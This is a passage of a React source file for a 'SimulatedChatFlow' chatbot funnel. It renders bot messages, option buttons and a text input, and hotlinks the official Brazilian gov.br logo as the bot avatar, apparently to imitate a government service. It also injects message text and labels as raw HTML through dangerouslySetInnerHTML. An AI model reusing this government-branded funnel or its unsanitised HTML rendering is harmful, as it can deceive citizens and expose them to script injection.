          <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={300} height={400} style={{ display:'block', maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee', margin: '0 auto' }} data-ai-hint={currentImageDetails.aiHint || "document image"}/>
        </div>
      )}
      
      {currentDisplayMessage && !isLoadingStep && (
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: '100%'}}>
           <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}>
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                {getIconComponent(currentDisplayMessage.displayIcon)}
                <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentDisplayMessage.text}} />}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                      <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                    </React.Fragment>
                  ))}
                </div>
              )}
               { (currentDisplayMessage.displayIcon && (funnelDefinition[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note) && (
                <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                    <strong>Nota:</strong> {(funnelDefinition[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note}
                </p>
              )}
           </div>
        </div>
      )}

      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {msg.sender === 'bot' && (
              <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            )}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
              {msg.sender === 'bot' && msg.options && !isBotTyping && !isTextInputActive && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text} 
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`}
                       dangerouslySetInnerHTML={{__html: opt.text}}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input"
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {isBotTyping && !isLoadingStep && !videoStepData && !currentDisplayMessage && !currentImageDetails && !isTextInputActive && (
         <div className="message-container bot-message-container">
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .message-container { display: flex; margin-bottom: 12px; max-width: 90%; }
        .bot-message-container { align-self: flex-start; }
        .user-message-container { align-self: flex-end; flex-direction: row-reverse; }
        .bot-avatar { width: 32px; height: 32px; border-radius: 50%; margin-right: 8px; margin-top: 4px; align-self: flex-start; object-fit: cover; }
        .message { padding: 10px 15px; border-radius: 18px; line-height: 1.4; font-size: 15px; word-wrap: break-word; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .bot-message { background-color: #f1f1f1; color: #333; border-radius: 12px; }
        .user-message { background-color: #1451b4; color: white; border-radius: 12px; margin-right: 0; }
        .user-message-container .user-message { margin-left: auto; }
        
        .options-container { 
          margin-top: 10px; 
          display: flex; 
          flex-direction: row; /* Horizontal layout */
          flex-wrap: wrap; /* Allow buttons to wrap */
          justify-content: flex-start; /* Align buttons to the start (left) */
          gap: 8px; 
          width: 100%; /* Options container takes full width relative to message bubble */
          padding-left: 40px; /* Align with bot text if avatar is present, or adjust as needed */
        }
        .chat-option-button {
          background-color: #0d6efd; /* Strong blue */
          color: white;
          border: none;
          padding: 8px 18px; 
          border-radius: 20px; /* Pill shape */
          cursor: pointer; 
          font-size: 14px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
          /* Removed width: auto; display: inline-block - flex properties on container will handle sizing */
        }
        .chat-option-button:hover { background-color: #0b5ed7; /* Darker blue on hover */ }

        .chat-option-button.primary_cta_button_gov_style { background-color: #16a34a; border-color: #16a34a; color: white; font-weight: bold;}
        .chat-option-button.primary_cta_button_gov_style:hover { background-color: #15803d; border-color: #15803d; color: white; }
        
        .chat-option-button.secondary_link_button_gov_style { background-color: transparent; border: none; color: #1451b4; text-decoration: underline; padding: 4px 0; box-shadow: none;}
        .chat-option-button.secondary_link_button_gov_style:hover { color: #0b2e63; background-color: transparent; }

        .chat-option-button.destructive_link_button_gov_style { background-color: transparent; border: none; color: #dc2626; text-decoration: underline; padding: 4px 0; box-shadow: none;}
        .chat-option-button.destructive_link_button_gov_style:hover { color: #b91c1c; background-color: transparent; }
        
        .typing-indicator { display: inline-flex; align-items: center; padding: 10px 15px; }
        .typing-indicator .dot { width: 8px; height: 8px; margin: 0 2px; background-color: #aaa; border-radius: 50%; animation: bounce 1.4s infinite; }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
        .display-message-block .bot-message { width: auto; max-width: 100%; }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;
